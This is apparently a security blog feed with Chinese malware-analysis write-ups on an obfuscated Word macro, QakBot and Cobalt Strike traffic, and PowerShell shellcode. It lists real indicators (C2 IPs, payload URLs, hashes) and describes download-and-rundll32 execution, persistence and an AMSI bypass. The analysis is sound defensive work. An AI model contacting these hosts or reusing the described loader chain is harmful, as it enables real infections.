alt="9"></p><p>此处我们可以看到由<strong>Document_open()<strong>函数调用</strong>Bn2p1rxokklh_9o8</strong></p><p>此处一共有3处函数，其中<strong>Bn2p1rxokklh_9o8()、Ipls8rqp952u2lk1(V8_prqa_b590f6uz6z)、Cws3jiyt47ovpsrhug(Mhb7dz_hsybhf0ic7)</strong></p><p>现在 这里我们直接在函数<strong>Ipls8rqp952u2lk1</strong>中的结束处进行下断点。让我们运行下看看</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-7.png" alt="7"></p><p>我们这里注意<strong>V8_prqa_b590f6uz6z</strong> <strong>和Ipls8rqp952u2lk1</strong>这两个变量</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-17.png" alt="17"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-10.png" alt="10"></p><p>在这里我们可以看到<strong>V8_prqa_b590f6uz6z</strong>变量为混淆的内容，而 <strong>Ipls8rqp952u2lk1</strong>最终的解密后的值为<strong>winmgmts:win32_process</strong>，这里混淆的key为最后一处函数 <strong>Cws3jiyt47ovpsrhug(Mhb7dz_hsybhf0ic7)</strong>,其中的 <strong>Replace</strong>引起了我们的注意，而<strong>w]xm[v</strong>就是我们的key</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-18.png" alt="18"></p><p>就像这样，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-11.png" alt="11"></p><p>当执行到最后，我们也可以看到完整的执行代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-12.png" alt="12"></p><p>而完整的混淆代码为如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-13.png" alt="13"></p><p>使用key对其进行替换，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-14.png" alt="14"></p><p>最终得出来的代码为如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-15.png" alt="15"></p><p>下面为执行的过程。调用cmd 进行弹窗和调用powershell</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-19.png" alt="19"></p><h4 id="3-3-PowerShell-分析"><a href="#3-3-PowerShell-分析" class="headerlink" title="3.3 PowerShell 分析"></a>3.3 PowerShell 分析</h4><p>我们对其powershell中的base64进行解密。得出的代码如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-20.png" alt="20"></p><p>我们可以看到powershell 也是进过混淆的，其中字符串的混淆为打乱排序,经过下图的类似的处理后</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-21.png" alt="21"></p><p>代码整理如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-22.png" alt="22"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-23.png" alt="23"></p><p>大体该脚本执行的流程为</p><p>1.创建目录为下面下载的文件提供路径。</p><p>2.下载DLL文件并命名为S93E.dll</p><p>3.调用rundll32执行DLL。</p><h4 id="3-4DLL执行"><a href="#3-4DLL执行" class="headerlink" title="3.4DLL执行"></a>3.4DLL执行</h4><p>在上述过程中我对其中几个url分别进行验证。只有两个网址是可以下载DLL的</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-29.png" alt="29"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-25.png" alt="25"></p><p>两个DLL的md5是不同的，但是其功能是相同的，下图为完整的执行过程。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-24.png" alt="24"></p><p>在这里调用rundll32 执行dll文件使用期函数showdialogA。对其释放和执行另一个dll文件,最后进行自我删除第一个DLL的动作</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-26.png" alt="26"></p><p>并对其进行注册表修改，添加启动项,为其进行后期的控制。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-27.png" alt="27"></p><p>同时我们可以看到 该DLL对外进行通信</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-28.png" alt="28"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-31.png" alt="31"></p><h3 id="四、IOC"><a href="#四、IOC" class="headerlink" title="四、IOC"></a>四、IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">文件名:&quot;QD0948945078TQ.doc&quot;</span><br><span class="line">sha256:27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5</span><br><span class="line">sha1:3a7a405ef3df95c1cfa18284749ff885a6430a88</span><br><span class="line">md5:2b310974bb4a113881471845a109b3de</span><br><span class="line"></span><br><span class="line">DLL文件</span><br><span class="line">md5C:\Users\admin\Kjl48kr\Nqm9ty9\S93E.dll0a3a2efb412b08e886f9856a5093c6e4</span><br><span class="line">    md5C:\Users\admin\Kjl48kr\Nqm9ty9\S93E.dll617231616b57a1a09e14cf068d9c8a21</span><br><span class="line"></span><br><span class="line">DNS requests</span><br><span class="line">    www.starlingtechs.com</span><br><span class="line"></span><br><span class="line">Connections</span><br><span class="line">ip71.72.196.159</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/HTTPS 请求</span><br><span class="line">urlhttps://www.starlingtechs.com/GNM/</span><br><span class="line">urlhttp://71.72.196.159/3xjgiyzod/r2dsukigxsy2d/4r9mzyqmmbgte85/nemcrg565qsoiqnnoa/fgpz1c4ee1mmcc/4wuwc0y5xm79x/</span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.virustotal.com/gui/file/27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5/behavior">https://www.virustotal.com/gui/file/27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5/behavior</a></p><p><a href="https://app.any.run/tasks/beef10b6-bc74-4f38-adf4-b9a3e83082b3/">https://app.any.run/tasks/beef10b6-bc74-4f38-adf4-b9a3e83082b3/</a></p><p><a href="https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-2-concatenation-and-base64-encoding/">https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-2-concatenation-and-base64-encoding/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-32.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>QakBot(Qbot)与cobalt Strike恶意流量样本分析</title>
    <link href="https://www.ggsec.cn/QakBot(Qbot)%E4%B8%8Ecobalt%20Strike%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/QakBot(Qbot)%E4%B8%8Ecobalt%20Strike%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</id>
    <published>2020-12-22T12:34:14.000Z</published>
    <updated>2022-11-25T12:55:05.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADD7AE0A77B70E8E2CC557DFCE6DA554.jpg" alt="enter description here"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>1.最近对流量分析这一块比较感兴趣，突然想研究研究，所以我找了一个今年12月份在Brad在博客上发布的由Qakbot造成的垃圾邮件感染的cs木马</p><p>2.brad对pcap包的说明：首先第一个pcap包为windows主机感染后的流量，第二个pcap包为新的windows主机感染qbot初期.</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-1.png" alt="1"></p><h3 id="QBOT介绍"><a href="#QBOT介绍" class="headerlink" title="QBOT介绍"></a>QBOT介绍</h3><p>Qakbot&#x2F;Qot通常是通过恶意垃圾邮件（malspam）分发的，但最近在2019年11月也通过漏洞利用工具包进行分发。在某些情况下，Qakbot是由Emotet之类的其他恶意软件引起的后续感染</p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h2><h3 id="2-1发现邮件"><a href="#2-1发现邮件" class="headerlink" title="2.1发现邮件"></a>2.1发现邮件</h3><p>首先我们来看第一个pcap包</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-2.png" alt="1"></p><p>受Qakbot感染的主机的pcap还具有与电子邮件相关的TCP流量，该TCP流量到各种端口的各种端口，例如SMTP，IMAP和POP3。要了解这种与网络无关的流量，请使用以下Wireshark过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp or imap or pop</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-3.png" alt="3"></p><p>通常我们不会看到这种从Windows客户端到公共IP地址的未加密电子邮件流量。连同其他一起，<strong>因此使用smtp or imap or pop过滤器可能会显示Qakbot活动</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-6.png" alt="6"></p><p>这里导出邮件，一共有7封邮件，每一个邮件里面都一个zip压缩包。下图为提取后为下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-7.png" alt="7"></p><p>同时压缩包全部解压文件后整理，为下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-8.png" alt="8"></p><h3 id="2-2分析Excel"><a href="#2-2分析Excel" class="headerlink" title="2.2分析Excel"></a>2.2分析Excel</h3><p>这里我们使用oletools套件的olevba和olebrowse分析Excel表格是否带有恶意的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-9.png" alt="9"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-12.png" alt="12"></p><p>我们可以看到使用U<em>RLDownloadToFile</em> 下从url下载了什么</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-13.png" alt="13"></p><p>同时使用 rundll32 运行了 .\appdata\kipofe.mmaallaauu 文件</p><h3 id="2-3抓捕流量"><a href="#2-3抓捕流量" class="headerlink" title="2.3抓捕流量"></a>2.3抓捕流量</h3><p>我们直接运行Excel表格，并打开wireshark和火绒剑进行监听。火绒剑我们这里就锁定进程rundll32即可。当我们运行了宏之后，在下图我们发现了103.50.160.62 （www。pharmainstruelec.com&#x2F;nezlzltik&#x2F;590906.jpg）获取这个jpg文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-10.png" alt="10"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-11.png" alt="11"></p><p>那么我们可以在第二个流量包找到类似相关qbot感染的活动路径</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-14.png" alt="14"></p><p>这里我们可以看到第二个流量包的数据 是mz开头的，一般mz开头不是exe就是dll 的文件。</p><p>那么剩下的几个Excel表格也是同样的分析。</p><p>样本整理后如下所示：</p><p><strong>压缩包文件</strong></p><table><thead><tr><th>SHA256</th><th>压缩包&#x2F;zip</th></tr></thead><tbody><tr><td>368e6de4bf4afecaa94be1c692adb75c27fad03d476bbcc2ac1ba6d3c72c7769</td><td>121154729-12072020.zip</td></tr><tr><td>e0fbf32c49dec4fd4556585d12a1f680beac60fcc4c7c975532192a2f5205468</td><td>21235375580-12072020.zip</td></tr><tr><td>3152420926e341d162c7932ee2720936db61878203f328df73d91feea4e8f988</td><td>2069264980-12072020.zip</td></tr><tr><td>d5977da587fb0e9ca77022e4db296daeca48479f9084c69dd753c3cb975c9770</td><td>32099437590-12072020.zip</td></tr><tr><td>e47404434669d3fe1d5617059fc1910b61a9aa39bc8e7d511989cb2df434358a</td><td>344492468-12072020.zip</td></tr><tr><td>329c2c596eb34ce97311dd1632d68f367351a4f8fa36d3000663c06aaaaf8be9</td><td>348173587-12072020.zip</td></tr><tr><td>ac82da8389a6f18b0658bc7a81f81e4b77a6e0ad890177f75f8d7c4a8b5b98fb</td><td>454409333-12072020.zip</td></tr></tbody></table><p><strong>从zip解压的Excel表格文件</strong></p><table><thead><tr><th>SHA256</th><th>Excel</th></tr></thead><tbody><tr><td>c7a23d2fbf73b3518e75a0a4f575f0420022db66eda48e165e31f730957f85af</td><td>121154729-12072020.xls</td></tr><tr><td>7d8fcca8451697ce3b69d3cc3907220537d9dde13ba3b12f6ae1521ab71122d1</td><td>21235375580-12072020.xls</td></tr><tr><td>c8c0674ece031e44bef02d2867980c02a7696041fe92ae05e004d7cd5d0cfd0c</td><td>32069264980-12072020.xls</td></tr><tr><td>38e12cb936dc2f1c8ae6ee8c2bd12c95a8bf26bc94b1b360e48458d619cad453</td><td>32099437590-12072020.xls</td></tr><tr><td>aff3fa3eeb5c3344b890953c6f932dd5ae4fc777a968d795b92651f75e0032df</td><td>344492468-12072020.xls</td></tr><tr><td>c641038179d8c7e53976eb8e2254b0210877a453c2ea10d54da5d015e23fddd3</td><td>348173587-12072020.xls</td></tr><tr><td>ed765542bc939d7e6cd87a616194919fbbde177caf0af4654ab3fd1675cdc24e</td><td>454409333-12072020.xls</td></tr></tbody></table><p><strong>Excel启用宏后生成的URL链接</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>url</th></tr></thead><tbody><tr><td>103.50.160.62</td><td>80</td><td><a href="http://www.pharmainstruelec.com/">www.pharmainstruelec。com</a></td><td>GET &#x2F;nezlzltik&#x2F;590906.jpg</td></tr><tr><td>35.208.103.169</td><td>80</td><td>hthwineandwood。com</td><td>GET &#x2F;niuikjzikf&#x2F;590906.jpg</td></tr><tr><td>35.214.219.237</td><td>80</td><td>norkupong。com</td><td>GET &#x2F;ljapekfahlob&#x2F;590906.jpg</td></tr><tr><td>35.214.136.217</td><td>80</td><td>raformatico。com</td><td>GET &#x2F;mjbgpabrmph&#x2F;590906.jpg</td></tr></tbody></table><p><strong>Excel下载后的DLL文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SHA256 hash: adaf53df8472ef0698b77be7b321334912e7c84f669ace078c342147555ea24f</span><br><span class="line">文件大小: 2,130,128 bytes</span><br><span class="line">文件web获取地址: www。pharmainstruelec.com/nezlzltik/590906.jpg</span><br><span class="line">文件保存路径: C:\Users\[username]\AppData\Kipofe.mmaallaauu</span><br><span class="line">文件描述: DLL file for Qakbot retrieved by macro from 454409333-12072020.xls</span><br><span class="line">运行命令: Rundll32.exe [filename],DllRegisterServer</span><br></pre></td></tr></table></figure><h3 id="2-4QAKBOT-活动路径"><a href="#2-4QAKBOT-活动路径" class="headerlink" title="2.4QAKBOT 活动路径"></a>2.4QAKBOT 活动路径</h3><p>让我们回到第一个流量包,当我们使用过滤器过滤掉 http&#x2F;http以及ssdp，我们不难发现 qbot的活动轨迹</p><p>在这里我们可以看到45.63.107。192 port 995 -Qakbot C2 来自https。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-15.png" alt="15"></p><p>那么我们跟踪下查看下该证书的内容，可以看到下图所示的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-22.png" alt="22"></p><p>以及由Qakbot引起的连接检查 www。openssl。org<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-21.png" alt="21"></p><p>同时我们可以看到比较熟悉的地址 api.ipify。org 这个地址通常是为了检查IP的才使用的。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-19.png" alt="19"></p><p>以及这里作者提到的 Qakbot tcp感染54.36.108.120 port 65400 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-20.png" alt="20"></p><p>这里可以看到由api.ipify。org 对IP的检测</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-23.png" alt="20"></p><h3 id="2-5-COBALT-STRIKE的活动路径"><a href="#2-5-COBALT-STRIKE的活动路径" class="headerlink" title="2.5 COBALT STRIKE的活动路径"></a>2.5 COBALT STRIKE的活动路径</h3><p>在这段我们可以看到cs的https连接</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-25.png" alt="25"></p><p>以及它的证书</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-24.png" alt="24"></p><p>在这里我们对amajai-technologies.work&#x2F;GSMu http流追踪</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-26.png" alt="26"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-18.png" alt="18"></p><p>我们这里索性把它dump下来，进行分析</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-16.png" alt="16"></p><p>在这里我们对其进行反汇编，可以见到比较熟悉的开头 ‘FCE8’，不难猜测可能是 COBALT STRIKE 的payload。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-17.png" alt="17"></p><p>由此我们可以判定 COBALT STRIKE 为https的分阶段式payload。</p><p><strong>QABKOT感染的路径</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>描述</th></tr></thead><tbody><tr><td>45.63.107.192</td><td>955</td><td></td><td>HTTPS  Qakbot C2</td></tr><tr><td>54.36.108.120</td><td>65400</td><td></td><td>Qakbot tcp感染路径</td></tr><tr><td>23.21.126.66</td><td>443</td><td>api.ipify。org</td><td>qbot的IP检查</td></tr><tr><td></td><td>443</td><td><a href="http://www.openssl.org/">www.openssl。org</a></td><td>由Qbot引起的连接检查</td></tr></tbody></table><p><strong>COBALT STRIKE的活动路径</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>描述</th></tr></thead><tbody><tr><td>23.106.160.138</td><td>8888</td><td>amajai-technologies.world</td><td>cs的https连接</td></tr><tr><td>23.106.160.137</td><td>80</td><td>amajai-technologies.work</td><td>GET &#x2F;GSMu  获得payload</td></tr><tr><td>23.106.160.137</td><td>80</td><td>amajai-technologies.work</td><td>GET &#x2F;IE9CompatViewList.xml  执行命令</td></tr></tbody></table><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://www.malware-traffic-analysis.net/2020/12/07/index.html">https://www.malware-traffic-analysis.net/2020/12/07/index.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADD7AE0A77B70E8E2CC557DFCE6DA554.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>powershell shellcode 样本分析</title>
    <link href="https://www.ggsec.cn/powershell%20shellcode%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/powershell%20shellcode%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</id>
    <published>2020-11-10T09:39:47.000Z</published>
    <updated>2022-11-25T12:53:13.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BDC93AC118C9144F16783F634F3C4F1B.jpg" alt="222"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前段时间找了一些样本分析的工具，有时候用起来不是很顺手，当我找到PCsXcetra发布的工具时，感觉比较顺手些。</p><p>我在GitHub上同时也找到了PCsXcetra对使用他的工具对样本的分析是如何事半功倍的。</p><p>本文将大体讲述相关样本分析工具而本文使用到的工具均为PCsXcetra的所在Derbycon 2019大会发布的相关工具。</p><p><a href="https://github.com/PCsXcetra/DerbyCon-2019Files">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p><p>接下来让我们看看PCsXcetra他是如何分析和合理使用他的工具的。</p><h2 id="2-样本1"><a href="#2-样本1" class="headerlink" title="2.样本1"></a>2.样本1</h2><p>接下来我们看一下这个样本在2018年11月份的powershell样本。首先我们可以清楚的看到整段代码为powershell 解码base64执行。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-1.png" alt="1"></p><p>解码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-2.png" alt="2"></p><p>代码整理后发现有一段还是有base64字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-3.png" alt="3"></p><p>之后，我们得到一个Powershell脚本Gzip流。解压缩后，我们看到了这一点。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-4.png" alt="4"></p><p>代码整理后，以及看到base64代码段。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-5.png" alt="5"></p><p>在这里，我们看到一个base64编码的字符串。这是我们编码的shellcode。它将被加载到虚拟内存中并运行。确切的实现可能会有所不同，但这是我最常看到的。</p><p>那把我们带到了我们想要的shellcode。现在我们可以将base64解码为十六进制。</p><p>使用PCsXcetra的 base64encode 转换。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-7.png" alt="7"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-6.png" alt="6"></p><p>这里发现没有任何信息。</p><p>尝试CyberChef 并查看程序集</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-12.png" alt="12"></p><p>好吧，这似乎也没有太大帮助。</p><p>那么现在怎么办。</p><p>新工具。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-9.png" alt="9"></p><p>这里选择hex ，得到信息为  一个IP地址和端口</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-10.png" alt="10"></p><p>同样我们这里可以使用选择bas64选项，得出来的结果和上面一样</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-11.png" alt="11"></p><h2 id="3-样本2"><a href="#3-样本2" class="headerlink" title="3.样本2"></a>3.样本2</h2><p>该样本在最初是由Paul Melson（PaulM @pmelson）ScumBots @ScumBots机器人在pastebin上发现的，并上传到Virus Total。</p><p>当我们第一次查看此脚本时，我们会注意到的是，它以一个非常大base64字符串。第二件事是将它与字符串“ +”分开，以使自动base64解码器混乱，后者无法处理将字符串放回并先删除它们的情况。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-13.png" alt="13"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-14.png" alt="14"></p><p>清理完base64字符串并进行base64解码后，我们看到了这一点。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-15.png" alt="15"></p><p>我们可以看到其中嵌入了base64编码的可执行文件。让我们先提取并快速浏览一下。</p><p>看来脚本将加载此Dll，这是AMSI Bypass方法，然后将加载shellcode。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-16.png" alt="16"></p><p>现在，让我们仔细看看这个shellcode。它不是以常规的“ 0xFC”开头。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-17.png" alt="17"></p><p>这很难看懂，其中发生了什么，那么我们用一款格式化工具看看，所以让我们对其进行一些格式化以更好地去查看代码。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-18.png" alt="18"></p><p>我们可以看到该shellcode已被拆分为多个数组，如图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-19.png" alt="19"></p><p>并将在运行时重新组合shellcode。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-20.png" alt="20"></p><p>现在已经重新组合好shellcode了，我们现在可以将其输入到我们的工具中以获取IP&#x2F;URL。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-21.png" alt="21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-22.png" alt="22"></p><p>还有API调用。因此它也将帮助您更深入地了解调用的内容，从而可能有助于更好地了解其功能，而不仅仅是在沙盒中运行可能显示的IP或Url。</p><p>参考链接：</p><p><a href="https://pcsxcetrasupport3.wordpress.com/2019/07/07/those-pesky-powershell-shellcodes-and-how-to-understand-them/">https://pcsxcetrasupport3.wordpress.com/2019/07/07/those-pesky-powershell-shellcodes-and-how-to-understand-them/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/BDC93AC118C9144F16783F634F3C4F1B.jpg&quot; alt=&quot;222&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Word宏样本分析</title>
    <link href="https://www.ggsec.cn/%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</id>
    <published>2020-10-30T10:03:35.000Z</published>
    <updated>2022-11-25T12:51:49.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-20.jpg" alt="20"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前段时间看到了一个非常有意思的宏病毒样本分析，决定与各位一起分析一下。</p><p>迄今为止，VBA宏仍然是最流行的攻击媒介之一。本文分析多层混淆的VBA宏，其中包括VBA，WMI对象，Powershell，内联C＃和BYPASS AMSI。</p><h2 id="2-初步分析"><a href="#2-初步分析" class="headerlink" title="2.初步分析"></a>2.初步分析</h2><p>我们首先在十六进制编辑器中检查.DOC。我们可以看到标头以PK开头，表示此类型的文件是ZIP。现代Microsoft Word文档实际上是ZIP文件，如果将文档从.DOC重命名为.ZIP，则可以解压缩内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-18.png" alt="18"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-19.png" alt="19"></p><p>我们首先需要提权文档的vba宏，使用olevba即可提取。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-1.png" alt="1"></p><p>经过提取下面的宏 我们发现可以看到VBA代码的格式不正确（很可能是故意的）。因此，我们需要通过替换多余的换行符（“ \ n”），制表符（“ \ t”）和空格（“ \ s”）来对其进行清理，直到获得正确格式的VBA代码为止。这不是运行代码所必需的，但是，如果要在Microsoft Word的开发人员工具中对其进行调试，则需要多行代码才能放置断点。</p><p>经过代码整理，格式化后我们就可以看到以下的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-2.png" alt="2"></p><p>我们可以看到以上代码基本都是经过混淆的代码，让我们在Microsoft Word中打开文档。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-4.png" alt="4"></p><p>复制替换为我们之前整理的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-5.png" 